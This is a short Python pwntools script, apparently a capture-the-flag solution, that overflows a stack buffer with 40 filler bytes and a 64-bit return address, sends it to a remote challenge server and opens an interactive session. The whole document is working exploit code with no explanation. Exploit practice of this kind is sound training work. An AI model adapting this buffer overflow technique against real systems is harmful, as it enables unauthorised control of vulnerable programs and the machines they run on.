from pwn import *

payload = 'A'*40+p64(0x400708)
p = remote('asia.pwn.zh3r0.ml', 3456)
print p.recv()
print p.recv()
p.sendline(payload)
p.interactive()
